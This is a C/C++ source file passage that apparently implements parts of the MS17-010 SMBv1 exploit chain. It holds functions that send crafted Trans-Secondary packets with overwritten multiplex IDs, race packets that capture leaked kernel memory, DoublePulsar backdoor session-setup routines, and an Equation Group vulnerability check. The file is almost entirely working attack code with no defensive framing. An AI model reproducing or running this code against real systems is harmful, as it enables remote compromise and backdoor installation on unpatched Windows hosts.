		SetLastError(NT_STATUS_INVALID_SMB);
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
		return FALSE;
	}

	if (GetUlong(&inbound->ThisSmb->Status.NtStatus) & 0xFFFFFFFFUL)
	{
		SetLastError(GetUlong(&inbound->ThisSmb->Status.NtStatus));
		PutUlong(&info->srv_last_error, GetUlong(&inbound->ThisSmb->Status.NtStatus));
		return FALSE;
	}

	return TRUE;
}

BOOLEAN SendRecvTransSecondaryMultiplexOverwrite(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info)
{
	unsigned int sendstatus[2] = { 0 }, recvstatus[2] = { 0 };
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };

	if (isnull(outbound) || isnull(inbound) || isnull(info))
		return FALSE;

	if (badsock(s))
		return FALSE;

	if (isnull(trans_secondary_mid_overwrite_packet(srv, 10251, get_uid(info), get_special_mid(info), get_tid(info))))
		return FALSE;

	PutUnsigned(sendstatus, SendData(srv, s, GetUnsigned(sendstatus + 1)));

	if (!GetUlong(sendstatus) || issockerr(GetUlong(sendstatus)))
		return FALSE;

	PutUnsigned(recvstatus, RecvData(client, 0x100, s, GetUnsigned(recvstatus + 1)));

	if (!GetUlong(recvstatus) || issockerr(GetUlong(recvstatus)))
		return FALSE;

	bwsalloc(&tmp, GetUlong(recvstatus));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);

	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);

	inbound->ThisSmb = MAKEPSMB(inbound->ThisPacket.pbdata + SMB_HEADER_OFFSET);
	outbound->ThisSmb = MAKEPSMB(outbound->ThisPacket.pbdata + SMB_HEADER_OFFSET);

	inbound->ThisNetbiosSize = (inbound->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
	outbound->ThisNetbiosSize = (outbound->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

	if (!cmp(inbound->ThisSmb->Protocol, "\xFFSMB", 4))
		return FALSE;

	if (inbound->ThisSmb->Status.NtStatus & 0xFFFFFFFF)
	{
		PutUlong(&info->srv_last_error, GetUlong(&inbound->ThisSmb->Status.NtStatus));
		SetLastError(info->srv_last_error);
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
		return FALSE;
	}

	return TRUE;
}

BOOLEAN SendRecvTransSecondaryFirstMuliplexZero(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info)
{
	unsigned int sendstatus[2] = { 0 }, recvstatus[2] = { 0 };
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };

	if (isnull(outbound) || isnull(inbound) || isnull(info))
		return FALSE;

	if (badsock(s))
		return FALSE;

	if (isnull(trans_secondary_first_mid_zero_packet(srv, 10252, get_uid(info), 0, get_tid(info))))
		return FALSE;

	PutUnsigned(sendstatus, SendData(srv, s, GetUnsigned(sendstatus + 1)));

	if (!GetUlong(sendstatus) || issockerr(GetUlong(sendstatus)))
		return FALSE;

	PutUnsigned(recvstatus, RecvData(client, 0x100, s, GetUnsigned(recvstatus)));

	if (!GetUlong(recvstatus) || issockerr(GetUlong(recvstatus)))
		return FALSE;

	bwsalloc(&tmp, GetUlong(recvstatus));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);

	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);

	inbound->ThisSmb = MAKEPSMB(inbound->ThisPacket.pbdata + SMB_HEADER_OFFSET);
	outbound->ThisSmb = MAKEPSMB(outbound->ThisPacket.pbdata + SMB_HEADER_OFFSET);

	inbound->ThisNetbiosSize = (inbound->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
	outbound->ThisNetbiosSize = (outbound->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

	if (!cmp(inbound->ThisSmb->Protocol, "\xFFSMB", 4))
	{
		SetLastError(NT_STATUS_INVALID_SMB);
		return FALSE;
	}
	return TRUE;
}

BOOLEAN SendRecvTransSecondaryFirstSpecialMultiplex(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info)
{
	unsigned int sendstatus[2] = { 0 }, recvstatus[2] = { 0 };
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };

	if (isnull(outbound) || isnull(inbound) || isnull(info))
		return FALSE;

	if (badsock(s))
		return FALSE;

	if (isnull(trans_secondary_first_special_mid_packet(srv,
		10251,
		get_uid(info),
		get_special_mid(info),
		get_tid(info))))
	{
		return FALSE;
	}

	PutUnsigned(sendstatus, SendData(srv, s, GetUnsigned(sendstatus + 1)));

	if (!GetUlong(sendstatus) || issockerr(GetUlong(sendstatus)))
		return FALSE;

	inbound->ThisNetbiosSize = inbound->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET;
	inbound->ThisSmb = MAKEPSMB(inbound->ThisPacket.pbdata + SMB_HEADER_OFFSET);

	return TRUE;
}

BOOLEAN SendRecvTransSecondaryRaceTypeOne(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, LeakedDataLinkedList* IN OUT leak, SOCKET& IN s, smb_info* IN info)
{
	unsigned int sendstatus[2] = { 0 }, recvstatus[2] = { 0 };
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, * leakbws = &leak->KrnlLeakResponse, tmp = { 0 };
	PRESP_TRANSACTION responsetransaction = NULL;
	PRESP_TRANSACTION_INTERIM responseinterim = NULL;

	if (isnull(outbound) || isnull(inbound) || isnull(info))
		return FALSE;

	if (badsock(s))
		return FALSE;

	if (isnull(trans_secondary_race_type_one_packet(srv, get_special_pid(info), get_uid(info), 0, get_tid(info))))
		return FALSE;

	PutUnsigned(sendstatus, SendData(srv, s, GetUnsigned(sendstatus + 1)));

	if (!GetUlong(sendstatus) || issockerr(GetUlong(sendstatus)))
		return FALSE;

	PutUnsigned(recvstatus, RecvData(client, 0x100, s, GetUnsigned(recvstatus + 1)));

	if (!GetUlong(recvstatus) || issockerr(GetUlong(recvstatus)))
		return FALSE;

	bwsalloc(&tmp, GetUlong(recvstatus));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);

	bwsalloc(leakbws, tmp.dwsize);
	cpy(leakbws->pbdata, tmp.pbdata, leakbws->dwsize);

	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);

	inbound->ThisNetbiosSize = inbound->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET;
	inbound->ThisSmb = MAKEPSMB(inbound->ThisPacket.pbdata + SMB_HEADER_OFFSET);

	outbound->ThisNetbiosSize = outbound->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET;
	outbound->ThisSmb = MAKEPSMB(outbound->ThisPacket.pbdata + SMB_HEADER_OFFSET);

	responsetransaction = ((PRESP_TRANSACTION)(leak->KrnlLeakResponse.pbdata + SMB_PARAM_OFFSET));

	leak->ResponseHeader = MAKEPSMB(leak->KrnlLeakResponse.pbdata + SMB_HEADER_OFFSET);
	leak->ResponseData = (MAKEPBYTE(leak->ResponseHeader) + responsetransaction->DataOffset);
	leak->ResponseParameters = MAKEPBYTE(leak->ResponseHeader) + responsetransaction->ParameterOffset;
	leak->ResponseNetbios = MAKEPDWORD(leak->KrnlLeakResponse.pbdata);


	if ((!cmp(leak->ResponseHeader->Protocol, "\xFFSMB", 4)) || (!cmp(inbound->ThisSmb->Protocol, "\xFFSMB", 4)))
	{
		SetLastError(NT_STATUS_INVALID_SMB);
		return FALSE;
	}

	return TRUE;
}

BOOLEAN SendRecvTransSecondarySecondMultiplexZero(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info)
{
	unsigned int sendstatus[2] = { 0 }, recvstatus[2] = { 0 };
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };

	if (isnull(outbound) || isnull(inbound) || isnull(info))
		return FALSE;

	if (badsock(s))
		return FALSE;

	if (isnull(trans_secondary_second_mid_zero_packet(srv, 10252, get_uid(info), 0, get_tid(info))))
		return FALSE;

	PutUnsigned(sendstatus, SendData(srv, s, GetUnsigned(sendstatus + 1)));

	if (GetUlong(sendstatus) == 0 || issockerr(GetUlong(sendstatus)))
		return FALSE;

	//PutUnsigned(recvstatus, RecvData(client, 0))

	outbound->ThisSmb = MAKEPSMB(outbound->ThisPacket.pbdata + SMB_HEADER_OFFSET);
	outbound->ThisNetbiosSize = outbound->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET;


	return TRUE;
}

BOOLEAN SendRecvTransSecondaryRaceTypeTwo(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, LeakedDataLinkedList* IN OUT leak, SOCKET& IN s, smb_info* IN info)
{
	static unsigned int sendsize[2], recvsize[2];
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, * leakbws = &leak->KrnlLeakResponse, tmp = { 0 };
	packet_creation_handler_type_one create_packet = &trans_secondary_race_type_two_packet;
	PRESP_TRANSACTION trans = NULL;


	if (isnull(outbound) || isnull(inbound) || isnull(info) || isnull(leak))
		return FALSE;

	if (badsock(s) || isnull(create_packet))
		return FALSE;

	if (isnull(create_packet(srv, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
		return FALSE;

	PutUnsigned(sendsize, SendData(srv, s, GetUnsigned(sendsize + 1)));

	if (!GetUlong(sendsize) || issockerr(GetUlong(sendsize)))
		return FALSE;

	PutUnsigned(recvsize, RecvData(client, 0x400, s, GetUnsigned(recvsize + 1)));

	if (!GetUlong(recvsize) || issockerr(GetUlong(recvsize)))
		return FALSE;

	bwsalloc(&tmp, GetUlong(recvsize));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);

	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);

	bwsalloc(leakbws, client->dwsize);
	cpy(leakbws->pbdata, client->pbdata, leakbws->dwsize);

	trans = (PRESP_TRANSACTION)(leakbws->pbdata + SMB_PARAM_OFFSET);

	inbound->ThisSmb = MAKEPSMB(inbound->ThisPacket.pbdata + SMB_HEADER_OFFSET);
	inbound->ThisNetbiosSize = inbound->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET;

	leak->ResponseHeader = MAKEPSMB(leakbws->pbdata + SMB_HEADER_OFFSET);
	leak->ResponseNetbios = MAKEPDWORD(leakbws->pbdata);
	leak->ResponseData = MAKEPBYTE(leak->ResponseHeader) + trans->DataOffset;
	leak->ResponseParameters = MAKEPBYTE(leak->ResponseHeader) + trans->ParameterOffset;

	outbound->ThisSmb = MAKEPSMB(srv->pbdata + SMB_HEADER_OFFSET);
	outbound->ThisNetbiosSize = srv->pbdata + NETBIOS_SIZE_OFFSET;


	if (!cmp(leak->ResponseHeader->Protocol, "\xFFSMB", 4) || !cmp(inbound->ThisSmb->Protocol, "\xFFSMB", 4))
		return FALSE;

	return TRUE;
}

BOOLEAN SendRecvTransSecondaryThirdMultiplexZero(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info)
{
	static unsigned int sendsize[2], recvsize[2];
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };
	packet_creation_handler_type_one create_packet = &trans_secondary_third_mid_zero_packet;


	if (isnull(outbound) || isnull(inbound) || isnull(info))
		return FALSE;

	if (badsock(s))
		return FALSE;

	if (isnull(create_packet))
		return FALSE;

	if (isnull(create_packet(srv, get_pid(info), get_uid(info), 0, get_tid(info))))
		return FALSE;

	PutUnsigned(sendsize, SendData(srv, s, GetUnsigned(sendsize + 1)));

	if (!GetUlong(sendsize) || issockerr(GetUlong(sendsize)))
		return FALSE;

	inbound->ThisNetbiosSize = NULL;
	inbound->ThisSmb = MAKEPSMB(NULL);

	outbound->ThisNetbiosSize = outbound->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET;
	outbound->ThisSmb = MAKEPSMB(outbound->ThisPacket.pbdata + SMB_HEADER_OFFSET);

	if (!cmp(outbound->ThisSmb->Protocol, "\xFFSMB", 4))
		return FALSE;

	return TRUE;
}

BOOLEAN SendRecvTransSecondarySecondRaceTypeTwo(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, LeakedDataLinkedList* IN OUT leak, SOCKET& IN s, smb_info* IN info)
{
	static unsigned int sendsize[2], recvsize[2];
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, * leakbws = &leak->KrnlLeakResponse, tmp = { 0 };
	packet_creation_handler_type_one create_packet = &trans_secondary_second_race_type_two_packet;
	PRESP_TRANSACTION trans = NULL;

	if (isnull(outbound) || isnull(inbound) || isnull(info))
		return FALSE;

	if (badsock(s))
		return FALSE;

	if (isnull(create_packet))
		return FALSE;

	if (isnull(create_packet(srv, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
		return FALSE;

	PutUnsigned(sendsize, SendData(srv, s, GetUnsigned(sendsize + 1)));

	if (!GetUlong(sendsize) || issockerr(GetUlong(sendsize)))
		return FALSE;

	PutUnsigned(recvsize, RecvData(client, 0x400, s, GetUnsigned(recvsize + 1)));

	if (!GetUlong(recvsize) || issockerr(GetUlong(recvsize)))
		return FALSE;

	bwsalloc(&tmp, GetUlong(recvsize));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);

	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);

	bwsalloc(leakbws, client->dwsize);
	cpy(leakbws->pbdata, client->pbdata, leakbws->dwsize);

	outbound->ThisNetbiosSize = srv->pbdata + NETBIOS_SIZE_OFFSET;
	outbound->ThisSmb = MAKEPSMB(srv->pbdata + SMB_HEADER_OFFSET);

	inbound->ThisNetbiosSize = client->pbdata + NETBIOS_SIZE_OFFSET;
	inbound->ThisSmb = MAKEPSMB(client->pbdata + SMB_HEADER_OFFSET);

	trans = (PRESP_TRANSACTION)(leak->KrnlLeakResponse.pbdata + SMB_PARAM_OFFSET);

	leak->ResponseData = MAKEPBYTE(leak->ResponseHeader) + trans->ParameterOffset;
	leak->ResponseHeader = MAKEPSMB(leakbws->pbdata + SMB_HEADER_OFFSET);
	leak->ResponseNetbios = MAKEPDWORD(leakbws->pbdata);
	leak->ResponseParameters = MAKEPBYTE(leak->ResponseHeader) + trans->ParameterOffset;

	if (!cmp(leak->ResponseHeader->Protocol, "\xFFSMB", 4) || !cmp(inbound->ThisSmb->Protocol, "\xFFSMB", 4))
		return FALSE;

	return TRUE;
}

BOOLEAN SendRecvTransSecondaryFourthMultiplexZero(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info)
{
	static unsigned int sendsize[2], recvsize[2];
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };
	packet_creation_handler_type_one create_packet = &trans_secondary_fourth_mid_zero_packet;

	if (isnull(outbound) || isnull(inbound) || isnull(info))
		return FALSE;

	if (badsock(s))
		return FALSE;

	if (isnull(create_packet))
		return FALSE;

	if (isnull(create_packet(srv, 10252, get_uid(info), 0, get_tid(info))))
		return FALSE;

	PutUnsigned(sendsize, SendData(srv, s, GetUnsigned(sendsize + 1)));

	if (!GetUlong(sendsize) || issockerr(GetUlong(sendsize)))
		return FALSE;

	outbound->ThisSmb = MAKEPSMB(outbound->ThisPacket.pbdata + SMB_HEADER_OFFSET);
	outbound->ThisNetbiosSize = (outbound->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

	inbound->ThisNetbiosSize = NULL, inbound->ThisSmb = NULL;

	return TRUE;
}

BOOLEAN SendRecvTransSecondaryThirdRaceTypeTwo(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, LeakedDataLinkedList* IN OUT leak, SOCKET& IN s, smb_info* IN info)
{
	static unsigned int sendsize[2], recvsize[2];
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, * leakbws = &leak->KrnlLeakResponse, tmp = { 0 };
	packet_creation_handler_type_one create_packet = &trans_secondary_second_race_type_two_packet;
	PRESP_TRANSACTION trans = NULL;

	if (isnull(inbound) || isnull(outbound) || isnull(info) || isnull(leak))
		return FALSE;

	if (badsock(s))
		return FALSE;

	if (isnull(create_packet))
		return FALSE;

	if (isnull(create_packet(srv, 0, get_uid(info), 0, get_tid(info))))
		return FALSE;

	PutUnsigned(sendsize, SendData(srv, s, GetUnsigned(sendsize + 1)));

	if (!GetUlong(sendsize) || issockerr(GetUlong(sendsize)))
		return FALSE;

	PutUnsigned(recvsize, RecvData(client, 0x400, s, GetUnsigned(recvsize + 1)));

	if (!GetUlong(recvsize) || issockerr(GetUlong(recvsize)))
		return FALSE;

	bwsalloc(&tmp, GetUlong(recvsize));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);

	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);

	if (isnull(leak->KrnlLeakResponse.pbdata))
	{
		bwsalloc(leakbws, client->dwsize);
		cpy(leakbws->pbdata, client->pbdata, leakbws->dwsize);
	}

	inbound->ThisNetbiosSize = (client->pbdata + NETBIOS_SIZE_OFFSET);
	inbound->ThisSmb = MAKEPSMB(client->pbdata + SMB_HEADER_OFFSET);

	outbound->ThisNetbiosSize = (srv->pbdata + NETBIOS_SIZE_OFFSET);
	outbound->ThisSmb = MAKEPSMB(srv->pbdata + SMB_HEADER_OFFSET);

	trans = (PRESP_TRANSACTION)(leakbws->pbdata + SMB_PARAM_OFFSET);

	leak->ResponseHeader = MAKEPSMB(leakbws->pbdata + SMB_HEADER_OFFSET);
	leak->ResponseNetbios = MAKEPDWORD(leakbws->pbdata);
	leak->ResponseParameters = (MAKEPBYTE(leak->ResponseHeader) + trans->ParameterOffset);
	leak->ResponseData = (MAKEPBYTE(leak->ResponseHeader) + trans->DataOffset);

	if (!cmp(leak->ResponseHeader->Protocol, "\xFFSMB", 4) || !cmp(inbound->ThisSmb->Protocol, "\xFFSMB", 4))
		return FALSE;

	return TRUE;
}

BOOLEAN SendRecvSecondNtCreateAndx(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info)
{
	static unsigned int sendsize[2], recvsize[2];
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };
	packet_creation_handler_type_one create_packet = &nt_create_andx_second_packet;
	PRESP_NT_CREATE_ANDX ntcreate = NULL;

	if (isnull(inbound) || isnull(outbound) || isnull(info))
		return FALSE;

	if (badsock(s))
		return FALSE;

	if (isnull(create_packet))
		return FALSE;

	if (isnull(create_packet(srv, 0, get_uid(info), 0, get_tid(info))))
		return FALSE;

	PutUnsigned(sendsize, SendData(srv, s, GetUnsigned(sendsize + 1)));

	if (!GetUlong(sendsize) || issockerr(GetUlong(sendsize)))
		return FALSE;

	PutUnsigned(recvsize, RecvData(client, 0x400, s, GetUnsigned(recvsize + 1)));

	if (!GetUlong(recvsize) || issockerr(GetUlong(recvsize)))
		return FALSE;

	inbound->ThisNetbiosSize = client->pbdata + NETBIOS_SIZE_OFFSET;
	inbound->ThisSmb = MAKEPSMB(client->pbdata + SMB_HEADER_OFFSET);

	outbound->ThisNetbiosSize = srv->pbdata + NETBIOS_SIZE_OFFSET;
	outbound->ThisSmb = MAKEPSMB(srv->pbdata + SMB_HEADER_OFFSET);

	if (!cmp(inbound->ThisSmb->Protocol, "\xFFSMB", 4))
		return FALSE;
	return TRUE;
}




/*
 *
 *
 *
 *	Double Pulsar networking functions
 *
 *
 *
 */

BOOLEAN SendRecvTrans2SessionSetup(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info)
{
	static unsigned int sendsize[2], recvsize[2];
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };
	packet_creation_handler_type_one create_packet = &trans2_session_setup_packet;

	if (isnull(outbound) || isnull(inbound) || isnull(info))
		return FALSE;

	if (badsock(s))
		return FALSE;

	if (isnull(create_packet))
		return FALSE;

	if (isnull(create_packet(srv, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
		return FALSE;

	PutUnsigned(sendsize, SendData(srv, s, GetUnsigned(sendsize + 1)));

	if (!GetUlong(sendsize) || issockerr(GetUlong(sendsize)))
		return FALSE;

	PutUnsigned(recvsize, RecvData(client, 0x400, s, GetUnsigned(recvsize + 1)));

	if (!GetUlong(recvsize) || issockerr(GetUlong(recvsize)))
		return FALSE;

	bwsalloc(&tmp, GetUlong(recvsize));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);

	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);

	inbound->ThisNetbiosSize = client->pbdata + NETBIOS_SIZE_OFFSET;
	outbound->ThisNetbiosSize = srv->pbdata + NETBIOS_SIZE_OFFSET;

	inbound->ThisSmb = MAKEPSMB(client->pbdata + SMB_HEADER_OFFSET);
	outbound->ThisSmb = MAKEPSMB(srv->pbdata + SMB_HEADER_OFFSET);

	if (!cmp(inbound->ThisSmb->Protocol, "\xFFSMB", 4))
		return FALSE;

	return TRUE;
}

BOOLEAN SendRecvTreeDisconnect(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info)
{
	static unsigned int sendsize[2], recvsize[2];
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };
	packet_creation_handler_type_one create_packet = &tree_disconnect_packet;

	if (isnull(outbound) || isnull(inbound) || isnull(info))
		return FALSE;

	if (badsock(s))
		return FALSE;

	if (isnull(create_packet))
		return FALSE;

	if (isnull(create_packet(srv, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
		return FALSE;

	PutUnsigned(sendsize, SendData(srv, s, GetUnsigned(sendsize + 1)));

	if (!GetUlong(sendsize) || issockerr(GetUlong(sendsize)))
		return FALSE;

	PutUnsigned(recvsize, RecvData(client, 0x400, s, GetUnsigned(recvsize + 1)));

	if (!GetUlong(recvsize) || issockerr(GetUlong(recvsize)))
		return FALSE;

	bwsalloc(&tmp, GetUlong(recvsize));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);

	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);

	inbound->ThisNetbiosSize = client->pbdata + NETBIOS_SIZE_OFFSET;
	outbound->ThisNetbiosSize = srv->pbdata + NETBIOS_SIZE_OFFSET;

	inbound->ThisSmb = MAKEPSMB(client->pbdata + SMB_HEADER_OFFSET);
	outbound->ThisSmb = MAKEPSMB(srv->pbdata + SMB_HEADER_OFFSET);

	if (!cmp(inbound->ThisSmb->Protocol, "\xFFSMB", 4))
		return FALSE;

	return TRUE;
}

BOOLEAN SendRecvLogoffAndx(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info)
{
	static unsigned int sendsize[2], recvsize[2];
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };
	packet_creation_handler_type_one create_packet = &logoff_andx_packet;

	if (isnull(outbound) || isnull(inbound) || isnull(info))
		return FALSE;

	if (badsock(s))
		return FALSE;

	if (isnull(create_packet))
		return FALSE;

	if (isnull(create_packet(srv, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
		return FALSE;

	PutUnsigned(sendsize, SendData(srv, s, GetUnsigned(sendsize + 1)));

	if (!GetUlong(sendsize) || issockerr(GetUlong(sendsize)))
		return FALSE;

	PutUnsigned(recvsize, RecvData(client, 0x400, s, GetUnsigned(recvsize + 1)));

	if (!GetUlong(recvsize) || issockerr(GetUlong(recvsize)))
		return FALSE;

	bwsalloc(&tmp, GetUlong(recvsize));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);

	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);

	inbound->ThisNetbiosSize = client->pbdata + NETBIOS_SIZE_OFFSET;
	outbound->ThisNetbiosSize = srv->pbdata + NETBIOS_SIZE_OFFSET;

	inbound->ThisSmb = MAKEPSMB(client->pbdata + SMB_HEADER_OFFSET);
	outbound->ThisSmb = MAKEPSMB(srv->pbdata + SMB_HEADER_OFFSET);

	if (!cmp(inbound->ThisSmb->Protocol, "\xFFSMB", 4))
		return FALSE;

	return TRUE;
}

/*
 *
 *
 *
 *	Equation Group MS17-10 vulnerablity check networking function(s)
 *
 *
 *
 */

BOOLEAN SendRecvTransPeekNamedPipeCheck(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info)
{
	static unsigned int sendsize[2], recvsize[2];
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };
	packet_creation_handler_type_one create_packet = &trans_peek_namedpipe_check_packet;

	if (isnull(outbound) || isnull(inbound) || isnull(info))
		return FALSE;

	if (badsock(s))
		return FALSE;

	if (isnull(create_packet))
		return FALSE;

	if (isnull(create_packet(srv, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
		return FALSE;

	PutUnsigned(sendsize, SendData(srv, s, GetUnsigned(sendsize + 1)));

	if (!GetUlong(sendsize) || issockerr(GetUlong(sendsize)))
		return FALSE;

	PutUnsigned(recvsize, RecvData(client, 0x400, s, GetUnsigned(recvsize + 1)));

	if (!GetUlong(recvsize) || issockerr(GetUlong(recvsize)))
		return FALSE;

	bwsalloc(&tmp, GetUlong(recvsize));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);

	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);


	inbound->ThisNetbiosSize = client->pbdata + NETBIOS_SIZE_OFFSET;
	outbound->ThisNetbiosSize = srv->pbdata + NETBIOS_SIZE_OFFSET;

	inbound->ThisSmb = MAKEPSMB(client->pbdata + SMB_HEADER_OFFSET);
	outbound->ThisSmb = MAKEPSMB(srv->pbdata + SMB_HEADER_OFFSET);


	if (!cmp(inbound->ThisSmb->Protocol, "\xFFSMB", 4))
		return FALSE;

	return TRUE;
}

#pragma warning(pop)